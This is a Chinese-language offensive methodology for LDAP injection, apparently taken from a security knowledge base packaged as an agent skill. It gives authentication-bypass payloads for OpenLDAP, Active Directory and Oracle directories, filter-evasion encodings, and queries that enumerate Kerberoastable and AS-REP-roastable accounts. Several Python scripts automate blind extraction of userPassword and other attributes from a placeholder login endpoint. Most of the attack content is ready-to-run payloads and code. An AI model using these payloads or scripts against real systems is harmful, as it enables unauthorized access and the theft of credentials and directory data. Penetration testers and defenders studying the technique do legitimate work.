# ldap-injection

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# LDAP 注入方法论

LDAP（轻量目录访问协议）广泛用于企业用户认证和目录查询。当应用将用户输入直接拼接到 LDAP 搜索过滤器中时，攻击者可以修改查询逻辑来绕过认证或提取目录数据。

## Phase 0: 识别 LDAP 后端

| 信号 | 含义 |
|------|------|
| 登录表单中有"域\用户名"或"user@domain.com"格式 | 可能是 LDAP/AD 认证 |
| 端口 389(LDAP)/636(LDAPS)/3268(Global Catalog) 开放 | 确认 LDAP 服务 |
| 错误信息含 `LDAP`、`javax.naming`、`ldap_bind` | 确认 LDAP 后端 |
| URL 参数中有 `uid`、`cn`、`ou`、`dc`、`sAMAccountName` | LDAP 属性名 |
| 使用 Active Directory 集成认证的 Web 应用 | LDAP 查询 |

## LDAP 过滤器语法速查

LDAP 使用前缀表达式（波兰记法）：

```
# 基础
(uid=john)                    # uid 等于 john
(cn=John Smith)               # cn 等于 John Smith

# 通配符
(uid=j*)                      # uid 以 j 开头
(uid=*john*)                  # uid 包含 john

# 逻辑操作
(&(uid=john)(password=pass))  # AND
(|(uid=john)(uid=admin))      # OR
(!(uid=guest))                # NOT

# 组合
(&(objectClass=user)(|(uid=john)(uid=admin)))
```

## Phase 1: 认证绕过

### 1.1 基础注入

假设后端查询为：`(&(uid=INPUT_USER)(userPassword=INPUT_PASS))`

```
# 注入用户名字段
用户名: *)(uid=*))(|(uid=*
密码: anything
→ 查询变为: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
→ 第一个过滤器 (uid=*) 匹配所有用户

# 或更简单：
用户名: *
密码: *
→ (&(uid=*)(userPassword=*)) → 匹配所有有密码的用户

# 闭合括号绕过
用户名: admin)(&)
密码: anything
→ (&(uid=admin)(&))(userPassword=anything)
→ (&) 是 LDAP 的 TRUE，永远为真

# 注释截断（某些实现支持）
用户名: admin)%00
密码: anything
→ (&(uid=admin)\x00)(userPassword=anything)
→ NULL 字节截断后面的密码检查
```

### 1.2 通配符认证绕过

```
# 如果只知道用户名前缀
用户名: adm*
密码: *
→ (&(uid=adm*)(userPassword=*)) → 匹配 admin/administrator 等

# 枚举有效用户名
用户名: a* → 有响应？用户名以 a 开头
用户名: ad* → 有响应？用户名以 ad 开头
用户名: adm* → 有响应？...
```

### 1.3 OR 注入

```
# 注入 OR 条件
用户名: admin)(|(password=*
密码: anything
→ (&(uid=admin)(|(password=*)(userPassword=anything)))
→ OR 条件使密码检查无效

# 另一种 OR 绕过
用户名: *)(|(objectClass=*
密码: test)
→ (&(uid=*)(|(objectClass=*)(userPassword=test)))
```

## Phase 2: 数据提取（盲注）

### 2.1 属性值盲注

通过通配符逐字符猜测属性值：

```
# 猜测 admin 的密码
(&(uid=admin)(userPassword=a*))  → 响应不同？密码以 a 开头
(&(uid=admin)(userPassword=ab*)) → 继续...
(&(uid=admin)(userPassword=abc*))

# 猜测 description 字段（可能含敏感信息）
(&(uid=admin)(description=flag*))
(&(uid=admin)(description=flag{*))
```

### 2.2 属性存在性探测

```
# 探测用户有哪些属性
(&(uid=admin)(telephoneNumber=*))  → 有电话号码？
(&(uid=admin)(mail=*))             → 有邮箱？
(&(uid=admin)(userPassword=*))     → 有密码？
(&(uid=admin)(sshPublicKey=*))     → 有 SSH 公钥？

# AD 环境特有属性
(&(sAMAccountName=admin)(adminCount=1))      → 是管理员？
(&(sAMAccountName=admin)(memberOf=*admin*))  → 在管理组中？
```

### 2.3 自动化盲注脚本

```python
#!/usr/bin/env python3
"""LDAP 盲注数据提取"""
import requests
import string

URL = "http://TARGET/login"
CHARSET = string.ascii_lowercase + string.digits + "_{}-@."
ATTR = "userPassword"

def check(username_payload):
    """发送 LDAP 注入请求"""
    data = {
        "username": username_payload,
        "password": "anything"
    }
    r = requests.post(URL, data=data)
    # 根据响应差异判断（长度/内容/状态码/重定向）
    return "Welcome" in r.text or r.status_code == 302

def extract(target_user, attribute):
    """逐字符提取属性值"""
    result = ""
    while True:
        found = False
        for c in CHARSET:
            # 注入: admin)(ATTR=result+c*
            payload = f"{target_user})({attribute}={result}{c}*"
            if check(payload):
                result += c
                print(f"[+] {attribute}: {result}")
                found = True
                break
        if not found:
            break
    return result

if __name__ == "__main__":
    pwd = extract("admin", "userPassword")
    print(f"[+] Extracted: {pwd}")
```

## Phase 3: 目录遍历

如果注入点在搜索查询（非认证）中：

```
# 提取所有用户
(&(objectClass=user)(uid=*))

# 提取管理员
(&(objectClass=user)(adminCount=1))

# 提取服务账户
(&(objectClass=user)(servicePrincipalName=*))

# 提取计算机
(&(objectClass=computer)(cn=*))

# 搜索特定组的成员
(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))
```

## Phase 4: 特殊技巧

### 4.1 NULL 字节截断

```
# 某些 LDAP 实现（如 OpenLDAP 旧版）支持 NULL 字节截断
admin)%00
→ 截断后面的密码过滤器
```

### 4.2 特殊字符转义绕过

LDAP 需要转义的字符：`* ( ) \ NUL`

```
# 如果应用转义了 *，尝试：
\2a  →  * 的十六进制转义
\28  →  ( 的十六进制转义
\29  →  ) 的十六进制转义
```

### 4.3 LDAP 与 AD 结合

如果 LDAP 后端是 Active Directory：
```
# 获取域管列表
(&(objectCategory=person)(adminCount=1))

# 获取 Kerberoastable 账户
(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))

# 获取 AS-REP Roastable 账户  
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# 获取密码永不过期账户
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
```

## 决策树

```
发现 LDAP 认证入口
├── 尝试 */* → 认证绕过？
├── 尝试 admin)(&)/ → 闭合+TRUE 绕过？
├── 尝试 admin)%00/ → NULL 截断？
├── 以上都失败
│   ├── 检查错误信息 → 确认是否 LDAP
│   ├── 检查通配符 a*/b*/c* → 用户名枚举
│   └── 非 LDAP → 尝试 SQL 注入
└── 认证成功或有注入点
    ├── 盲注提取密码/属性
    ├── 遍历目录（用户/组/计算机）
    └── AD 环境 → Kerberoast/AS-REP 目标发现
```

## 深入参考

- LDAP 注入 payload 与盲注技术 → [references/ldap-exploitation.md](references/ldap-exploitation.md)


---

## REF: ldap-exploitation

# LDAP 注入 Payload 与盲注技术

## 不同实现的行为差异

理解目标 LDAP 实现的解析行为是构造有效 payload 的前提。

| 实现 | 多过滤器行为 | 截断支持 | 备注 |
|------|-------------|---------|------|
| OpenLDAP | 仅执行第一个过滤器，忽略后续 | NULL 字节 `%00`（旧版本） | 最宽松，注入成功率高 |
| Microsoft AD/LDS | 双过滤器抛出错误 | 不支持 NULL 截断 | 需要严格闭合括号 |
| Oracle Internet Directory | 严格解析，拒绝畸形过滤器 | 不支持 | 需要语法完全合法 |
| SunOne/Oracle DSEE | 执行所有过滤器 | 部分支持 | 多过滤器注入可行 |

## 按实现分类的认证绕过 Payload

### OpenLDAP 专用

```ldap
# 利用 OpenLDAP 只执行第一个过滤器
user: *)(uid=*))(|(uid=*
pass: anything
→ (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
→ OpenLDAP 只看 (&(uid=*)(uid=*))，匹配所有用户

# NULL 截断（OpenLDAP < 2.4.x）
user: admin)%00
pass: anything
→ (&(uid=admin)\x00)(userPassword=anything)

# 利用 present 过滤器
user: *)(objectClass=*
pass: anything
→ (&(uid=*)(objectClass=*)(userPassword=anything))
```

### Active Directory 专用

```ldap
# AD 使用 sAMAccountName 而非 uid
user: *)(&
pass: *)(&
→ (&(sAMAccountName=*)(&)(userPassword=*)(&))
→ (&) 为绝对 TRUE

# 利用 NOT+OR 逻辑短路
user: admin)(!(&(|
pass: any))
→ (&(sAMAccountName=admin)(!(& (|) (userPassword=any))))
→ (|) 为绝对 FALSE，NOT(AND(FALSE, ...)) = TRUE

# AD 属性注入提取组信息
user: admin)(memberOf=*
pass: test)
→ (&(sAMAccountName=admin)(memberOf=*)(userPassword=test))
```

### Oracle Internet Directory

```ldap
# 必须保持严格语法，利用 OR 注入
user: *)(|(objectClass=*
pass: x)
→ (&(uid=*)(|(objectClass=*)(userPassword=x)))

# 利用合法子串匹配
user: adm*
pass: *
→ (&(uid=adm*)(userPassword=*))
```

## 过滤器绕过技术

### 特殊字符编码绕过

当应用对常见注入字符做了过滤时：

```ldap
# 十六进制编码
\2a = *     # 通配符
\28 = (     # 左括号
\29 = )     # 右括号
\5c = \     # 反斜杠
\00 = NUL   # 空字节

# 示例：如果 * 被过滤
user: admin)(\5c2a
→ 部分解析器会将 \2a 还原为 *

# URL 编码叠加
user: admin%29%28uid%3d%2a
→ 解码为 admin)(uid=*
```

### 括号平衡技巧

```ldap
# 补全缺失的右括号
user: admin)(cn=*))(&(cn=void
→ (&(uid=admin)(cn=*))(&(cn=void)(userPassword=...))
→ 第一个完整过滤器被执行

# 利用嵌套逻辑
user: *)(|(cn=*)(sn=*
pass: ))
→ (&(uid=*)(|(cn=*)(sn=*))(userPassword=)))
```

### WAF/过滤器绕过

```ldap
# 大小写混合（LDAP 属性名不区分大小写）
uId=admin  等同于  uid=admin
objectCLASS=*  等同于  objectClass=*

# OID 替代属性名
0.9.2342.19200300.100.1.1=admin  等同于  uid=admin
2.5.4.3=admin  等同于  cn=admin

# 空格插入（某些解析器容忍属性名前后空格）
( uid = admin )
```

## 高级盲注数据提取

### 二分法加速提取

```python
#!/usr/bin/env python3
"""基于二分法的 LDAP 盲注提取，减少请求数"""
import requests

URL = "http://TARGET/login"

def check(payload):
    r = requests.post(URL, data={"user": payload, "pass": "x"})
    return "Welcome" in r.text

def extract_char(user, attr, known, low=32, high=126):
    """二分法确定单个字符"""
    while low < high:
        mid = (low + high) // 2
        # 利用 >= 比较符（部分 LDAP 实现支持）
        payload = f"{user})({attr}>={known}{chr(mid)}*"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low - 1) if low > 32 else None

def extract(user, attr):
    result = ""
    while True:
        c = extract_char(user, attr, result)
        if c is None:
            break
        result += c
        print(f"[+] {attr}: {result}")
    return result
```

### 无通配符盲注

某些环境过滤 `*` 字符，需要不依赖通配符的盲注方式：

```python
#!/usr/bin/env python3
"""无通配符 LDAP 盲注——利用 >= 和 <= 比较"""
import requests
import string

URL = "http://TARGET/search"
CHARSET = string.ascii_letters + string.digits + "_{}-@."

def check(filter_payload):
    r = requests.get(URL, params={"q": filter_payload})
    return len(r.text) > 100  # 根据实际响应调整

def extract_no_wildcard(user, attr):
    """利用范围比较逐字符提取"""
    result = ""
    for pos in range(50):
        found = False
        for c in CHARSET:
            # >=c 且 <下一个字符 → 精确匹配当前字符
            payload = f"{user})({attr}>={result}{c}"
            if check(payload):
                result += c
                print(f"[+] {attr}[{pos}]: {result}")
                found = True
                break
        if not found:
            break
    return result
```

### 属性枚举与批量提取

```python
#!/usr/bin/env python3
"""枚举目标用户的有效 LDAP 属性"""
import requests

URL = "http://TARGET/login"
COMMON_ATTRS = [
    "uid", "cn", "sn", "givenName", "mail", "telephoneNumber",
    "userPassword", "description", "title", "department",
    "memberOf", "homeDirectory", "loginShell", "sshPublicKey",
    "street", "postalCode", "mobile", "pager", "jpegPhoto",
    # AD 特有
    "sAMAccountName", "distinguishedName", "servicePrincipalName",
    "adminCount", "lastLogon", "pwdLastSet", "userAccountControl",
]

def attr_exists(user, attr):
    payload = f"{user})({attr}=*"
    r = requests.post(URL, data={"user": payload, "pass": "x"})
    return "Welcome" in r.text

target = "admin"
print(f"[*] 枚举 {target} 的属性...")
for attr in COMMON_ATTRS:
    if attr_exists(target, attr):
        print(f"  [+] {attr} 存在")
```

## 基于错误的注入识别

不同实现返回不同的错误信息，可用于指纹识别：

```
# OpenLDAP 错误
"Invalid DN syntax"
"Bad search filter"
"ldap_search: Bad search filter"

# Microsoft AD/LDS 错误
"Server is unwilling to perform"
"A referral was returned from the server"
"javax.naming.NamingException"

# Java LDAP (JNDI) 错误
"javax.naming.directory.InvalidSearchFilterException"
"Unbalanced parenthesis"

# PHP LDAP 错误
"ldap_search(): Search: Bad search filter"
"Supplied argument is not a valid ldap search filter"

# Python python-ldap 错误
"ldap.FILTER_ERROR"
"Bad search filter"
```

## LDAP 注入检测清单

```
1. 发送单个特殊字符测试响应差异
   ├── *    → 通配符是否被解释
   ├── )    → 括号是否导致错误
   ├── )(   → 是否可以闭合+开启新条件
   └── %00  → NULL 截断是否有效

2. 确认注入后判断实现类型
   ├── 两个过滤器 → 只执行一个 → OpenLDAP
   ├── 两个过滤器 → 报错 → AD/LDS
   └── 两个过滤器 → 都执行 → SunOne/DSEE

3. 选择利用路径
   ├── 认证绕过 → 按实现选择对应 payload
   ├── 盲注提取 → 有通配符用通配符法，无通配符用比较法
   └── 目录遍历 → 结合 objectClass 枚举对象
```
